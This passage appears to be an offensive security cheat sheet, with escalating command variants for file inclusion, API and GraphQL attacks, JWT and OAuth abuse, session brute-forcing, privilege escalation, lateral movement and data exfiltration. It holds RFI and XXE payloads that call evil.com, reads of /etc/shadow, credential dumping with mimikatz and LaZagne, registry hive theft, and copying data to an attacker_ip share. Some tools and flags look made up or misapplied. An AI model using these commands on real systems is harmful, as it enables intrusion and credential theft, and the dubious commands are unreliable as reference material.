    fimap -u 'https://target.com/page?file=XXE' -x
    dotdotpwn -m http -h target.com -u /vuln/page?f=TRAVERSAL -k root
    ------
    lfisuite -u https://target.com/view?file=../../../../etc/passwd -o lfi_results_passwd.txt -b "root:"
    lfisuite -u https://target.com/index.php?page=http://evil.com/malicious.txt -o rfi_evil.txt -r "evil content"
    fimap -u 'https://target.com/page?file=XXE' -x -o fimap_xxe.txt --rhost evil.com --rport 8080
    fimap -u 'https://target.com/image?name=../../../../etc/shadow' --lfi-only -o fimap_lfi_shadow.txt
    dotdotpwn -m http -h target.com -u /vuln/page?f=TRAVERSAL -k root -d 5 -t 10
    dotdotpwn -m ftp -h target.com -u /../../../../etc/passwd -P 21 -k root
    ------
    lfisuite -u https://target.com/view?file=....//....//....//etc/passwd -o lfi_results_dots.txt -b "root:"
    lfisuite -u https://target.com/index.php?page=http://evil.com/malicious.txt%00 -o rfi_nullbyte.txt -r "evil content"
    fimap -u 'https://target.com/page?file=XXE' -x -o fimap_xxe_full.txt --rhost evil.com --rport 8080 --data '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>'
    fimap -u 'https://target.com/image?name=..%2f..%2f..%2f..%2fetc%2fshadow' --lfi-only -o fimap_lfi_encoded.txt
    dotdotpwn -m http -h target.com -u /vuln/page?f=TRAVERSAL -k root -d 7 -t 15 -s /usr/share/seclists/Fuzzing/LFI/LFI-paths.txt
    dotdotpwn -m ftp -h target.com -u /../../../../../../../../etc/passwd -P 21 -k root -o ftp_lfi.txt

### SSTI:
    tplmap -u 'https://target.com/page?name=John'

### CRLF:
    crlfuzz -u "https://target.com" -p 10

### CORS:
    corsy -u https://target.com

# 4. API TESTING

## 4.1 REST API
    kiterunner -w api_wordlist.txt -u https://target.com/api
    kiterunner -w api_wordlist.txt -u https://target.com/api -A discovery
    arjun -u https://target.com/api --include='application/json'
    postman-smuggler -r request.txt
    postman-smuggler -r request.txt -o smuggled_requests
    crAPI -u https://target.com/api -t 20 -o crapi_report.html
    restler fuzz --grammar_file api_spec.json --dictionary words.txt
    ------
    kiterunner -w api_endpoints.txt -u https://target.com/api -A discovery,security -o kiterunner_full.txt -threads 30
    kiterunner -w swagger.json -u https://target.com/api -A all -o kiterunner_swagger.txt
    arjun -u https://target.com/api --include='application/json','application/xml' -o arjun_api_all.json -m all -t 20
    arjun -u https://target.com/api/users/{id} --method PUT --params '{"username":"test","email":"test@example.com"}' -o arjun_put.txt
    postman-smuggler -r request.txt -o smuggled_requests_all -v
    postman-smuggler -r malicious_request.txt -o smuggled_malicious
    crAPI -u https://target.com/api -t 30 -o crapi_report_full.html -deep
    crAPI -u https://target.com/api -auth-type basic -username user -password pass -o crapi_auth.html
    restler fuzz --grammar_file api_spec.json --dictionary words.txt --host target.com --port 443 --ssl
    restler fuzz --grammar_file openapi.yaml --api_key $API_KEY
    swagger-cli validate swagger.json
    swagger-cli bundle swagger.json -o bundled_swagger.json
    ------
    kiterunner -w api_endpoints_extensive.txt -u https://target.com/api -A discovery,security,fuzz -o kiterunner_extensive.txt -threads 40 -v
    kiterunner -w openapi.json -u https://target.com/api -A all -o kiterunner_openapi_full.txt -report-format json
    arjun -u https://target.com/api --include='application/json','application/xml','text/plain' -o arjun_api_all_types.json -m all -t 35 -H "X-Custom-Header: value"
    arjun -u https://target.com/api/users/{id} --method PATCH --params '{"is_admin":true}' -o arjun_patch_admin.txt -b "401,403"
    postman-smuggler -r complex_request.txt -o smuggled_complex -vv
    postman-smuggler -r auth_bypass_request.txt -o smuggled_auth_bypass
    crAPI -u https://target.com/api -t 40 -o crapi_report_very_full.html -deep -rate-limit 200
    crAPI -u https://target.com/api -auth-type bearer -token $BEARER_TOKEN -o crapi_bearer.html
    restler fuzz --grammar_file api_spec.json --dictionary words.txt --host target.com --port 443 --ssl --request_timeout 60
    restler fuzz --grammar_file graphql.json --api_key $GRAPHQL_KEY --method POST --data '{"query": "{ __schema { queryType { name } } }"}'
    swagger-cli bundle swagger.yaml -o bundled_swagger.json --type yaml
    swagger-cli validate bundled_swagger.json --schemaType yaml

## 4.2 GraphQL
    graphqlmap -u https://target.com/graphql --dump-schema
    clairvoyance -o schema.json https://target.com/graphql
    inql -t https://target.com/graphql -o inql_results
    graphw00f -d -f -t https://target.com/graphql
    ------
    graphqlmap -u https://target.com/graphql --dump-schema -o schema.gql
    graphqlmap -u https://target.com/graphql --batching -o batching_vuln.txt
    clairvoyance -o schema_full.json https://target.com/graphql -v
    clairvoyance -o introspection_disabled.json https://target.com/graphql -b
    inql -t https://target.com/graphql -o inql_results_full -headers "Authorization: Bearer token"
    inql -t https://target.com/graphql -o inql_mutation_test --mutation 'mutation { createUser(name: "test", email: "test@example.com") { id } }'
    graphw00f -d -f -t https://target.com/graphql -e
    graphw00f -d -b -t https://target.com/graphql
    ------
    graphqlmap -u https://target.com/graphql --dump-schema -o schema_very_full.gql --depth 5
    graphqlmap -u https://target.com/graphql --batching -o batching_vuln_detailed.txt --batch-size 10
    clairvoyance -o schema_hidden.json https://target.com/graphql -v --hidden
    clairvoyance -o custom_headers.json https://target.com/graphql -h "Authorization: Bearer admin_token"
    inql -t https://target.com/graphql -o inql_results_extensive -headers "X-CSRF-Token: value" -cookies "sessionid=..."
    inql -t https://target.com/graphql -o inql_mutation_complex --mutation 'mutation { updateUser(id: 1, data: { isAdmin: true }) { success } }'
    graphw00f -d -f -t https://target.com/graphql -e -v
    graphw00f -d -b -t https://target.com/graphql --timeout 15

## 4.3 SOAP/WSDL
    wsdlfuzz -u https://target.com/wsdl -o wsdl_results.xml
    soapui -s https://target.com/service?wsdl -t test_case
    ------
    wsdlfuzz -u https://target.com/service?wsdl -o wsdl_results_full.xml -d 3
    wsdlfuzz -u https://target.com/api.asmx?wsdl -o asmx_fuzz.xml -w /usr/share/seclists/Fuzzing/SOAP-WSDL/Common-SOAP-Requests.txt
    soapui -s https://target.com/service?wsdl -t security_test_suite -j
    soapui -s https://target.com/old_service?wsdl -p admin -w password
    ------
    wsdlfuzz -u https://target.com/service?wsdl -o wsdl_results_deep.xml -d 5 -w /usr/share/seclists/Fuzzing/SOAP-WSDL/SOAP-Parameter-Fuzzing.txt
    wsdlfuzz -u https://target.com/api.asmx?wsdl -o asmx_fuzz_extended.xml -w custom_soap_payloads.txt -headers "Content-Type: text/xml"
    soapui -s https://target.com/service?wsdl -t security_test_suite_full -j -Dprop1=value1 -Dprop2=value2
    soapui -s https://target.com/old_service?wsdl -p admin -w password -s "Negative Tests"

# 5. AUTHENTICATION TESTING

## 5.1 JWT
    jwt_tool eyJhbGci...
    jwt_tool eyJhbGci... --exploit -X a -pc name -pv admin
    crackjwt -t eyJhbGci... -w rockyou.txt
    crackjwt -t eyJhbGci... -w wordlist.txt -a HS256
    jwt-hack -t token.jwt -m all -o results.txt
    ------
    jwt_tool eyJhbGci... --exploit -X k -kc "" -pc admin -pv true
    jwt_tool eyJhbGci... --exploit -X n -i
    jwt_tool eyJhbGci... --exploit -X s -hs none
    crackjwt -t eyJhbGci... -w /usr/share/wordlists/rockyou.txt -a HS256,RS256 -v
    crackjwt -t eyJhbGci... -k $(cat private.key) -a RS256 -m verify
    jwt-hack -t token.jwt -m all -o results_full.txt -d /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt
    jwt-hack -t token.jwt -m alg none -s ""
    jwt-hack -t token.jwt -m kid inject -p '{"kid": "../../evil.jwk"}'
    ------
    jwt_tool eyJhbGci... --exploit -X k -kc " " -pc admin -pv " "
    jwt_tool eyJhbGci... --exploit -X n -i -is none
    jwt_tool eyJhbGci... --exploit -X s -hs HS256 -k ""
    crackjwt -t eyJhbGci... -w /usr/share/wordlists/rockyou.txt -a HS256,RS256,ES256 -v -j 8
    crackjwt -t eyJhbGci... -k $(cat public.key) -a RS256 -m verify -p
    jwt-hack -t token.jwt -m all -o results_very_full.txt -d /usr/share/seclists/Passwords/Common-Credentials/probable-v2-top15.txt -delay 1
    jwt-hack -t token.jwt -m cve-2019-11477 -s '{"alg":"none"}'
    jwt-hack -t token.jwt -m jwk -j $(cat evil.jwk)

## 5.2 OAuth
    oauth2test -u https://target.com/oauth -c client_id -r redirect_uri
    burp-oauth -c config.json -p 8080
    ------
    oauth2test -u https://target.com/oauth/authorize -c client_id -r http://evil.com/callback -s invalid_scope
    oauth2test -u https://target.com/oauth/token -g authorization_code -d "client_id=...&client_secret=...&grant_type=authorization_code&code=..." -m POST
    burp-oauth -c config_full.json -p 8080 -v
    burp-oauth -c implicit_grant.json -p 8081
    ------
    oauth2test -u https://target.com/oauth/authorize -c client_id -r http://evil.com/callback -s openid profile email address -response_type code id_token
    oauth2test -u https://target.com/oauth/token -g authorization_code -d "client_id=...&client_secret=...&grant_type=authorization_code&code=...&redirect_uri=http://evil.com/callback" -m POST -H "Content-Type: application/x-www-form-urlencoded"
    burp-oauth -c config_extensive.json -p 8080 -v -debug
    burp-oauth -c implicit_grant_full.json -p 8081 -intercept

## 5.3 Session Management
    session-fuzz -u https://target.com/login -c cookies.txt -p params.txt
    session-bruteforcer -u https://target.com -t tokens.txt
    ------
    session-fuzz -u https://target.com/login -c cookies.txt -p /usr/share/seclists/Fuzzing/HTTP-Methods-and-More/HTTP-Methods.txt -m PUT,DELETE
    session-fuzz -u https://target.com/change_password -c session_cookie -d "old_password=test&new_password=FUZZ&confirm_password=FUZZ" -w /usr/share/seclists/Passwords/Common-Credentials/top-passwords.txt
    session-bruteforcer -u https://target.com/api/session -H "X-Session-Token: FUZZ" -t valid_tokens.txt -r "valid"
    ------
    session-fuzz -u https://target.com/login -c cookies.txt -p /usr/share/seclists/Fuzzing/HTTP-Methods-and-More/all.txt -m GET,POST,PUT,DELETE,OPTIONS,TRACE
    session-fuzz -u https://target.com/change_password -c session_cookie -d "current_password=FUZZ&new_password=newpass&confirm_password=newpass" -w /usr/share/seclists/Passwords/Common-Credentials/top-passwords.txt -rate 50
    session-bruteforcer -u https://target.com/api/session -H "Authorization: Bearer FUZZ" -t long_token_list.txt -r "valid" -threads 20

# 6. POST-EXPLOITATION

## 6.1 Privilege Escalation
### Linux:
    linpeas.sh
    linpeas.sh -a -t -s -p -c -S -r -e -P -C
    linux-exploit-suggester.sh -k 5.4.0-26-generic
    pspy64
    pspy64 -p -i -U -C -f
    SUID3NUM -q -p -s -g
    ------
    linpeas.sh -a -t -s -p -c -S -r -e -P -C -l -u -n -i -d /tmp -w /tmp/writable
    linux-exploit-suggester.sh -k $(uname -r) -l
    searchsploit Linux kernel $(uname -r)
    find / -perm -u=s -type f 2>/dev/null
    find / -perm -g=s -type f 2>/dev/null
    find / -writable -type d 2>/dev/null
    find / -user $(whoami) -perm -0400 -type f 2>/dev/null
    pspy64 -p -i -U -C "/bin/bash" -f "root"
    SUID3NUM -q -p -s -g -w
    ------
    linpeas.sh -a -t -s -p -c -S -r -e -P -C -l -u -n -i -d /tmp -w /tmp/writable -b -o /tmp/linpeas_full.txt
    linux-exploit-suggester.sh -k $(uname -r) -l -c
    searchsploit Linux kernel $(uname -r) local privesc
    find / -perm -o=w -type f 2>/dev/null
    find / -nouser -o -nogroup -type f 2>/dev/null
    find / -name "*.so" -perm -u=s -type f 2>/dev/null
    pspy64 -p -i -U -C "/usr/bin/sudo" -f "$(whoami)"
    SUID3NUM -q -p -s -g -w -v


### Windows:
    winpeas.exe
    winpeas.exe all quiet csv outputfile=winpeas.csv
    windows-exploit-suggester.py --database 2021-04-15-mssb.xls --ostext 'Windows 10'
    Watson.exe --search all --output results.txt
    ------
    winpeas.exe all quiet csv outputfile=winpeas_full.csv -nobanner
    windows-exploit-suggester.py --database 2023-01-01-mssb.xls --ostext 'Windows Server 2019' --arch 64
    Watson.exe --search all --output results_full.txt --modules kernel32.dll,advapi32.dll
    accesschk.exe -quvwc users c:\
    accesschk.exe -quvwc "Authenticated Users" "HKLM\SYSTEM\CurrentControlSet\Services"
    Get-Process -Id 1 | Get-ObjectSecurity | Format-List -Property *
    Get-Service | Where-Object {$_.StartMode -eq "Auto" -and $_.StartName -ne "NT AUTHORITY\SYSTEM"}
    ------
    winpeas.exe all quiet csv outputfile=winpeas_very_full.csv -nobanner -detailed
    windows-exploit-suggester.py --database 2024-01-01-mssb.xls --ostext 'Windows Server 2022' --arch 64 --cve CVE-2020-*
    Watson.exe --search all --output results_extensive.txt --modules *.dll
    accesschk.exe -quvwc everyone c:\windows
    accesschk.exe -quvwce "NT AUTHORITY\SYSTEM" * /accepteula
    Get-WmiObject -Class Win32_Service | Where-Object {$_.StartMode -eq "Auto" -and $_.StartName -like "*LocalSystem*"} | Format-Table Name, StartName, PathName
    Get-ScheduledTask | Where-Object {$_.settings.runlevel -eq "HighestAvailable"} | Format-Table TaskName, Author

## 6.2 Lateral Movement
    crackmapexec smb 192.168.1.0/24 -u user -p pass -M mimikatz
    evil-winrm -i 192.168.1.10 -u admin -p Password123
    ------
    crackmapexec smb 192.168.1.0/24 -u user -p pass -M psexec -o psexec_success.txt
    crackmapexec rdp 192.168.1.0/24 -u user -p pass -o rdp_success.txt
    evil-winrm -i 192.168.1.10 -u admin -p Password123 -e "powershell -c 'Get-Process'"
    ssh -o StrictHostKeyChecking=no user@192.168.1.15 "whoami"
    ------
    crackmapexec smb 192.168.1.0/24 -u user -p pass -M wmiexec -o wmiexec_success.txt -x "whoami"
    crackmapexec ldap 192.168.1.0/24 -u user -p pass -o ldap_success.txt --pass-pol
    evil-winrm -i 192.168.1.10 -u admin -p Password123 -e "powershell -c 'Invoke-Command -ComputerName remotehost -ScriptBlock { Get-Process }'"
    ssh -o StrictHostKeyChecking=no -i id_rsa user@192.168.1.15 "ls -l"

## 6.3 Data Exfiltration
    mimikatz.exe "sekurlsa::logonpasswords" "exit"
    LaZagne.exe all -oA
    ------
    mimikatz.exe "sekurlsa::ekeys" "exit" > ekeys.txt
    LaZagne.exe browsers -oN browser_creds.txt
    reg save HKLM\SAM sam.hive
    reg save HKLM\SYSTEM system.hive
    python -m http.server 8080 # Serve files for exfil
    ------
    mimikatz.exe "sekurlsa::tickets /export" "exit" > tickets.kirbi
    LaZagne.exe all -oJ all_creds.json
    reg save HKLM\SECURITY security.hive
    net share \\\\attacker_ip\\share c$\ /grant:Everyone,FULL
    copy c:\important_data \\\\attacker_ip\\share\important_data

# 7. REPORTING & AUTOMATION

## 7.1 Report Generation
    nuclei -l urls.txt -t nuclei-templates/ -me reports/ -s critical,high
    dalfox report -o report.html
    dalfox report -o report.html --format html --input scan.json
    arachni --report-save-path=report.afr --checks=active/* https://target.com
    ------
    nuclei -l urls.txt -t nuclei-templates/ -me reports/ -s critical,high -json -o nuclei_report.json
    dalfox report -o report.md --format markdown --input scan.json
    arachni --report-save-path=report_full.afr --checks=* https://target.com
    ------
    nuclei -l urls.txt -t nuclei-templates/ -me reports/ -s critical,high -json -o nuclei_report_full.json -template-display-mode id
    dalfox report -o report_detailed.html --format html --input scan.json --severity-min critical --export-type markdown
    arachni --report-save-path=report_very_full.afr --checks=* --scope-exclude-pattern "logout|signout" https://target.com


## 7.2 Workflow Automation
    bugbounty-auto -c config.yaml -t target.com -o output/
    reconftw -d target.com -a -r -w -o reconftw_output
    autorecon --only-scans --output scans/ target.com
    interlace -tL targets.txt -c "nuclei -u _target_"
    ------
    bugbounty-auto -c config_advanced.yaml -t target.com -o output_full/
    reconftw -d target.com -a -r -w -o reconftw_all -threads 50 -v
    autorecon --full --output autorecon_full/ target.com
    ------
    bugbounty-auto -c config_very_advanced.yaml -t target.com -o output_very_full/
    reconftw -d target.com -a -r -w -o reconftw_ultimate -threads 75 -v -all-scripts
    autorecon --full --scripts all --output autorecon_ultimate/ target.com

# 8. UTILITIES

## 8.1 Wordlist Management
    cewl https://target.com -d 3 -m 5 -w custom_words.txt
    kwprocessor -b 1 -e 2 -l 3 --stdout > keyboard_walk.txt
    domain-analyzer -d target.com -o keywords.txt
    seclists -h
    custom-list -d target.com -o custom_wordlist.txt
    ------
    cewl https://target.com -d 5 -m 10 -w custom_words_deep.txt --email --meta --no-words
    kwprocessor -b 2 -e 3 -l 4 --stdout --numbers --symbols > keyboard_walk_complex.txt
    domain-analyzer -d target.com -o keywords_full.txt -t 5
    puredns resolve -l subdomains.txt -r /etc/resolv.conf -w resolved.txt
    puredns bruteforce subdomains.txt target.com -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt -o brute_resolved.txt
    ------
    cewl https://target.com -d 6 -m 15 -w custom_words_extreme.txt --email --meta --no-words --lowercase --strip-words "the,and,for"
    kwprocessor -b 3 -e 4 -l 5 --stdout --numbers --symbols --leet > keyboard_walk_ultimate.txt
    domain-analyzer -d target.com -o keywords_ultimate.txt -t 7 -s 100
    puredns resolve -l subdomains.txt -r /etc/resolv.conf -w resolved_full.txt -threads 50
    puredns bruteforce subdomains.txt target.com -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt -o brute_resolved_full.txt -threads 50 -rate 1000
    gobuster vhost -u FUZZ.target.com -w subdomains.txt -t 100 -o vhost_brute.txt
    gobuster s3 -u target-bucket.s3.amazonaws.com -w aws_s3_bucket_names.txt -t 50 -o s3_brute.txt

## 8.2 Data Processing
    gf xss urls.txt | tee xss_urls.txt
    anew old.txt new.txt > combined.txt
    urldedupe -s urls.txt > unique_urls.txt
    ------
    gf xss urls.txt | grep -v "logout\|redirect" | tee xss_filtered.txt
    anew old.txt new1.txt new2.txt > combined_all.txt
    urldedupe -s urls_large.txt -o unique_large.txt -threads 20
    sed -i 's/http:/https:/g' urls_http.txt # Replace http with https
    awk '/param=/ {print $0}' urls_with_params.txt > params_only.txt
    ------
    gf xss urls.txt | grep -Po '([\'"]).*?\1' | tee xss_quotes.txt
    anew old1.txt old2.txt new1.txt new2.txt > combined_mega.txt
    urldedupe -s massive_urls.txt -o unique_massive.txt -threads 100 -buffer-size 100000
    sed -i 's/https:\/\/www\./https:\/\//g' urls_no_www.txt
    awk -F'=' '{print $2}' urls_with_equals.txt > values_only.txt
    cut -d '/' -f 3 urls_hostname_only.txt | sort -u | tee hostnames.txt

## 8.3 Network Utilities
    proxychains -q nmap -sT -Pn -n target.com
    mitmproxy -w traffic.mitm -s script.py
    curl -I https://target.com
    ------
    proxychains4 -q nmap -sT -Pn -n target.com -p 1080
    mitmproxy -w traffic_full.mitm -s advanced_script.py
    socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80
    ssh -D 1080 user@proxy.server # SOCKS proxy
    ------
    proxychains4 -q nmap -sT -Pn -n target.com -p 1080 -i -c proxychains.conf
    mitmproxy -w traffic_ultimate.mitm -s advanced_script.py --ssl-insecure --anticache
    socat TCP-LISTEN:4433,fork OPENSSL:127.0.0.1:443,cert=server.pem,key=server.key
    tcpdump -i eth0 -nn -vv -X port 80 or port 443 -w traffic.pcap
    tshark -r traffic.pcap -T fields -e http.request.method -e http.request.uri | sort -u

## 8.4 Password Cracking
    hashcat -m 0 hashes.txt rockyou.txt
    john --wordlist=rockyou.txt hashes.txt

## 8.5 File Upload Testing
    upload-fuzz -u https://target.com/upload -f payloads/

    # Cloud-Specific Tools (Security Hardening Checks)
    scoutsuite --provider aws --regions all --output-dir scout_all_regions_detailed --checks all
    prowler -g cislevel1,pci,hipaa -r all -M json -o prowler_compliance.json
    aws-nuke --config aws-nuke.yaml --profile default --dry-run
    gcloud compute firewall-rules list --project target-project
    az network security-group list --resource-group target-rg --output table

# Fuzzing Tools (General Purpose)
    wfuzz -c -z file,/usr/share/seclists/Fuzzing/Injections/SQLi/Generic-SQLi.txt --hc 200 https://target.com/index.php?id=FUZZ
    radamsa -n 1000 -o mutated.txt < input.txt
    afl-fuzz -i in -o out -t 10000 -m 100 -x /usr/share/seclists/Fuzzing/fuzzing-patterns.txt -- ./vulnerable_program @@
